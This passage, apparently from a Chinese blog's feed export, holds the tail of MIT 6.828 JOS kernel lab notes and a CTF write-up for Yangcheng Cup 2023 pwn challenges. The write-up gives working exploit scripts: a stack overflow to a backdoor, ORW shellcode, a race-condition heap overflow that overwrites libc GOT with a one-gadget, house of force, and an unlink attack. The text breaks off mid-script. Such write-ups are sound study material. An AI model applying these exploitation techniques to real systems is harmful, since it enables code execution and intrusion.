class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">trap</span><span class="params">(<span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// The environment may have set DF and some versions</span></span><br><span class="line"><span class="comment">// of GCC rely on DF being clear</span></span><br><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">"cld"</span> ::: <span class="string">"cc"</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that interrupts are disabled.  If this assertion</span></span><br><span class="line"><span class="comment">// fails, DO NOT be tempted to fix it by inserting a "cli" in</span></span><br><span class="line"><span class="comment">// the interrupt path.</span></span><br><span class="line">assert(!(read_eflags() &amp; FL_IF));</span><br><span class="line"></span><br><span class="line">cprintf(<span class="string">"Incoming TRAP frame at %p\n"</span>, tf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="number">3</span>) == <span class="number">3</span>) {</span><br><span class="line"><span class="comment">// Trapped from user mode.</span></span><br><span class="line">assert(curenv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Copy trap frame (which is currently on the stack)</span></span><br><span class="line"><span class="comment">// into 'curenv-&gt;env_tf', so that running the environment</span></span><br><span class="line"><span class="comment">// will restart at the trap point.</span></span><br><span class="line">curenv-&gt;env_tf = *tf;</span><br><span class="line"><span class="comment">// The trapframe on the stack should be ignored from here on.</span></span><br><span class="line">tf = &amp;curenv-&gt;env_tf;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Record that tf is the last real trapframe so</span></span><br><span class="line"><span class="comment">// print_trapframe can print some additional information.</span></span><br><span class="line">last_tf = tf;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Dispatch based on what type of trap occurred</span></span><br><span class="line">trap_dispatch(tf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return to the current environment, which should be running.</span></span><br><span class="line">assert(curenv &amp;&amp; curenv-&gt;env_status == ENV_RUNNING);</span><br><span class="line">env_run(curenv);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>trap函数进一步根据中断向量号分发(trap_dispatch)到各真正的中断处理例程(本实现中IDT中保存的只是一个中断处理例程的entry).<br>完成异常处理后,调用env_run函数恢复原环境(进程).</p><h3 id="Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls"><a href="#Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls" class="headerlink" title="Part B: Page Faults, Breakpoints Exceptions, and System Calls"></a>Part B: Page Faults, Breakpoints Exceptions, and System Calls</h3><h4 id="The-Breakpoint-Exception"><a href="#The-Breakpoint-Exception" class="headerlink" title="The Breakpoint Exception"></a>The Breakpoint Exception</h4><p>调试器执行的原理:临时替换断点处的1字节指令为int 3系统调用触发The Breakpoint Exception.在这里的实现中会调用内核监视器monitor,添加两个命令nextstep和continue,前者会修改eflags的FL_TF位使处理器开始单步执行,每次执行完成发出一个中断号为1的debug exception,在本实现中该异常处理例程同样会启动monitor.</p><blockquote><p>The breakpoint exception, interrupt vector 3 (T_BRKPT), is normally used to allow debuggers to insert breakpoints in a program’s code by temporarily replacing the relevant program instruction with the special 1-byte int3 software interrupt instruction.</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_nextstep</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(!tf)</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"empty Trapframe"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">cprintf(<span class="string">"$rip: %p\n"</span>,tf-&gt;tf_eip);</span><br><span class="line"><span class="keyword">switch</span>(tf-&gt;tf_trapno)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">case</span> T_BRKPT:</span><br><span class="line">tf-&gt;tf_eflags |= FL_TF;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">case</span> T_DEBUG:</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_eflags &amp; FL_TF)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">cprintf(<span class="string">"nextstep(ni) can only called via int 3(breakpoint exception)\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_continue</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(!tf)</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"empty Trapframe"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(tf-&gt;tf_trapno==T_DEBUG||tf-&gt;tf_trapno==T_BRKPT)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_eflags &amp; FL_TF) </span><br><span class="line">{</span><br><span class="line">            tf-&gt;tf_eflags &amp;= ~FL_TF;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">cprintf(<span class="string">"continue can only called via breakpoint or debug exception!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="System-calls-系统调用"><a href="#System-calls-系统调用" class="headerlink" title="System calls 系统调用"></a>System calls 系统调用</h4><p>注意权限位的检验采用(perm&amp;(*pte))==perm的形式,想象一下交集便于理解这一操作.(一些类型转换使程序看起来很乱,ye..i know…)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">user_mem_check</span><span class="params">(<span class="keyword">struct</span> Env *env, <span class="type">const</span> <span class="type">void</span> *va, <span class="type">size_t</span> len, <span class="type">int</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="type">uintptr_t</span> start_va = ROUNDDOWN((<span class="type">uintptr_t</span>)va,PGSIZE);</span><br><span class="line"><span class="type">uintptr_t</span> end_va = ROUNDUP((<span class="type">uintptr_t</span>)(va+len),PGSIZE);</span><br><span class="line"><span class="type">pte_t</span>* pte;</span><br><span class="line"><span class="keyword">for</span>(;start_va&lt;end_va;start_va+=PGSIZE)</span><br><span class="line">{</span><br><span class="line">pte = pgdir_walk(env-&gt;env_pgdir,(<span class="type">void</span>*)start_va,<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span>(start_va&gt;=ULIM||pte==<span class="literal">NULL</span>||!(*pte&amp;PTE_P)||((perm&amp;(*pte))!=perm))</span><br><span class="line">{</span><br><span class="line">user_mem_check_addr = start_va&gt;(<span class="type">uintptr_t</span>)va?start_va:(<span class="type">uintptr_t</span>)va;</span><br><span class="line"><span class="keyword">return</span> -E_FAULT;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="syscall流程分析"><a href="#syscall流程分析" class="headerlink" title="syscall流程分析"></a>syscall流程分析</h5><p>用户进程调用sys_xxx函数(其实用户并不直接调用这样的函数,而是由更上一层的函数如cprintf之类的调用.<del>这里的用户指的是使用JOS而不是开发JOS的开发者hh</del>),向操作系统申请xxx的操作,sys_xxx函数调用syscall函数,syscall函数使用int 0x30触发中断.<br>(上述sys_xxx,syscall函数均为lib/syscall.c中定义的由用户进程使用的函数,而非kern/syscall.c中的内核使用的实现)</p><p>中断处理过程参考上面的trap流程分析.<br>最终被分发到内核的syscall函数,该函数通过调用相应的内核函数完成功能,并设置系统调用返回值,之后正常从中断返回到用户进程.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2023 复现</title>
      <link href="/2023/ycb2023/"/>
      <url>/2023/ycb2023/</url>
      
        <content type="html"><![CDATA[<p>heap没出没进线下…</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>qemu-riscv64 -g 2333 ./pwn<br>gdbinit这样设置方便调试,然后gdb-multiarch -x gdbinit就能调了</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set arch riscv:rv64</span><br><span class="line">target remote 127.0.0.1:2333</span><br><span class="line">define hook-stop</span><br><span class="line">    info reg</span><br><span class="line">    echo "\n\n\n\n\n"</span><br><span class="line">    x/10i $pc</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b *0x123457EA</span><br><span class="line">c</span><br></pre></td></tr></tbody></table></figure><span id="more"></span><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281240372.png"></p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>main函数,一次向unk_12347078读入8字节,一次向栈上读入最多0x120字节,没有溢出.之后跳转到sub_12345786函数,即vuln.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281230369.png"><br>vuln函数:<br>调用strlen函数检查之前在main函数中第二次输入的数据长度是否小于8,这里有个andi a4,a5,0xFF的操作,即只取了strlen结果的低8位,则0x108被转换成0x8,完成绕过.而返回地址恰好存储在strcpy(dest,source)的dest+0x100的地方,正好可以覆盖.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281229972.png"><br>还有个后门函数不过有过滤,可以直接跳到这个位置绕过过滤.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281239787.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">offset = <span class="number">0x100</span></span><br><span class="line">backdoor = <span class="number">0x12345770</span></span><br><span class="line">payload = <span class="string">b"a"</span>*offset + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b'name:'</span>, <span class="string">b'/bin/sh\x00'</span>)</span><br><span class="line">io.sendafter(<span class="string">b'words'</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>有个offbynull,第17个字节没有限制可以输入ret的字节码.<br>第一次输入时输入syscall的字节码,第二次输入shellcode利用栈上数据布置read的参数.第三次正式读入orw的shellcode,dup2改一下fd.<br>偷搬wp.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b'[2] Input: (ye / no)\n'</span>, <span class="string">b'\x0f\x05'</span>) <span class="comment"># syscall</span></span><br><span class="line">sc = <span class="string">'''</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push rbx </span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">pop rsp</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">shellcode= asm(sc)</span><br><span class="line">sa(<span class="string">b'======== Input Your P0P Code ========'</span>, shellcode)</span><br><span class="line">sc = <span class="string">'''</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x200000000</span></span><br><span class="line"><span class="string">mov rax, 0x21</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, 2</span></span><br><span class="line"><span class="string">mov rax, 0x21</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,2</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 90</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0x200000000</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload = (<span class="number">0x48</span> + <span class="number">2</span>) * <span class="string">b'a'</span> + asm(sc)</span><br><span class="line">s(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><h3 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h3><p>大概逻辑是主函数读取输入,根据输入开启单独线程进行相应的堆操作.<br>注意下输入的格式.</p><p>看了很久没找到洞.由于处理输入是在单独的线程中,考虑过条件竞争,但否定了,当时的理由是:<br>    “开启一个线程1后,线程1开始简单逻辑,主线程回到fgets阻塞等待IO,待结束阻塞后才开启线程2,由于IO操作,程序正常运行情况下线程2一定是在线程1完成逻辑并结束后再开启的,不会存在竞争现象.”</p><p>看了其他师傅的wp才发现edit函数中有个sleep(1)….ok那就竞争吧.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309291610316.png"><br>相关调试命令</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd = '''</span><br><span class="line">set scheduler-locking on</span><br><span class="line">breakrva 0x1955</span><br><span class="line">c</span><br><span class="line">breakrva 0x14f8</span><br><span class="line">c</span><br><span class="line">'''</span><br></pre></td></tr></tbody></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>既然edit会sleep(1),那就在edit等待的时候替换掉全局变量里的堆块指针,指向一个更小的chunk,在本题中便可制造一个0x18字节的堆溢出.glibc2.35的0x18字节堆溢出,想想都麻烦,不过好在这题的特殊结构,可以覆盖content_ptr制造一个任意地址读写.<br>好在main函数能正常退出,可以直接改返回地址了.<br>发现libc只是partial relro,可以改下got表,我exp是直接改onegadget了.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309291616663.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309301605803.png"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>具体有点麻烦的,多调调吧,主要就是memncpy会用\0填满n字节,然后我们又要用一次部分覆写…<br>这libc的environ末尾还是00…<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309291936629.png"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content:<span class="built_in">bytes</span></span>):</span><br><span class="line">    payload = <span class="string">b'1 '</span></span><br><span class="line">    payload += content</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    payload = <span class="string">b'2 '</span></span><br><span class="line">    payload += <span class="built_in">str</span>(idx).encode()</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    payload = <span class="string">b'3 '</span></span><br><span class="line">    payload += <span class="built_in">str</span>(idx).encode()+<span class="string">b':'</span>+content</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    payload = <span class="string">b'4 '</span></span><br><span class="line">    payload += <span class="built_in">str</span>(idx).encode()</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    payload = <span class="string">b'5 '</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    payload = <span class="string">b'/bin/sh\x00'</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b'a'</span>*<span class="number">0x62</span>)<span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b'a'</span>*<span class="number">0x60</span>+<span class="string">b'\xa0\x08'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b'b'</span>*<span class="number">0x58</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b'a'</span>*<span class="number">0x58</span>)<span class="comment">#1</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">'paper index: '</span>)</span><br><span class="line">io.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">leak_libc(<span class="string">'puts'</span>,u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">0x198db0</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(libc_base).startswith(<span class="string">"0x7f"</span>):</span><br><span class="line">    <span class="keyword">raise</span> EOFError</span><br><span class="line"></span><br><span class="line">add(<span class="string">b'a'</span>*<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b'a'</span>*<span class="number">0x60</span>+p64(libc_base+<span class="number">0x219098</span>))<span class="comment">#libc.got['strlen']</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b'a'</span>*<span class="number">0x50</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b'k'</span>*<span class="number">0x50</span>)<span class="comment">#3</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">onegadget = libc_base+<span class="number">0xebcf1</span></span><br><span class="line"><span class="comment"># edit(3,p64(system_addr))</span></span><br><span class="line">edit(<span class="number">3</span>,p64(onegadget))</span><br><span class="line"><span class="comment"># shell()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="easy-force"><a href="#easy-force" class="headerlink" title="easy_force"></a>easy_force</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序只有一个功能,可以看出malloc的size不限,最多可以制造0x20的堆溢出.且可以得到堆块的地址(mmap的堆块就是libc地址).符合house of force的条件.改下got表就好了.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309302115399.png"></p><p>覆盖got表的时候可以用one_gadget,看了别的师傅的巧妙布置,覆盖malloc_got为system,然后在size输入binsh字符串的地址.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309302114666.png"></p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ask(<span class="number">0</span>,<span class="number">0x30000</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'on '</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">' '</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">leak_libc(<span class="string">'puts'</span>,libc_addr-<span class="number">0x54b970</span>)</span><br><span class="line"></span><br><span class="line">ask(<span class="number">1</span>,<span class="number">0x10</span>,flat([<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="number">0</span>,-<span class="number">1</span>]))</span><br><span class="line">io.recvuntil(<span class="string">'on '</span>)</span><br><span class="line">top = <span class="built_in">int</span>(io.recvuntil(<span class="string">' '</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br><span class="line">ask(<span class="number">2</span>,force(top,e.got[<span class="string">'malloc'</span>]),<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">ask(<span class="number">3</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'4.go away\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'index?'</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">io.sendlineafter(<span class="string">'want'</span>,<span class="built_in">str</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>改0x30为v2就好,记得补nop.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309302130948.png"></p><h2 id="Printf-but-not-fmtstr"><a href="#Printf-but-not-fmtstr" class="headerlink" title="Printf_but_not_fmtstr"></a>Printf_but_not_fmtstr</h2><p>题目名称意义不明.glibc2.36堆题但是partial relro,能改got就改got了.有uaf,堆块限制在0x500-0x900.</p><p>先unsortedbin泄露地址,然后打unlink.</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x518</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress()-<span class="number">0x1f6cc0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span 